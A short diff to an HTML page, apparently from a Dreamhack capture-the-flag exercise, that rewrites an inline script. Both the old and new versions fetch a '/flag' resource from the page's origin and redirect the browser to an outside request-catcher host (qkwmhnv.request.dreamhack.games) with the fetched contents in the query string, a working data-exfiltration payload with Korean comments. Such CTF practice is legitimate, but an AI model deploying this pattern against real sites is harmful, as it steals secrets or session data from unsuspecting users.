@@ -3,15 +3,22 @@
 <head><meta charset="utf-8"><title>Pages JS 테스트</title></head>
 <body>
   <h1>Hello Pages!!</h1>
-  <script>
-   async function readIndex() {
-  const res = await fetch(new URL('/flag', location.href), { cache: 'no-store' }); 
-  if (!res.ok) throw new Error(`HTTP ${res.status}`);
-  const html = await res.text();
-  console.log(html);
-  location.href = "https://qkwmhnv.request.dreamhack.games?flag="+html
+ <script>
+async function readFlag() {
+  try {
+    const res = await fetch('./flag', { cache: 'no-store' });
+    if (!res.ok) throw new Error(`HTTP ${res.status}`);
+    const text = (await res.text()).trim();
+
+    // 길이가 짧을 때만 쿼리로 전송
+    const target = 'https://qkwmhnv.request.dreamhack.games?flag=' + encodeURIComponent(text);
+    location.href = target; // 페이지 이동으로 전달
+  } catch (e) {
+    console.error(e);
+  }
 }
-readIndex();
-  </script>
+readFlag();
+</script>
+
 </body>
 </html>
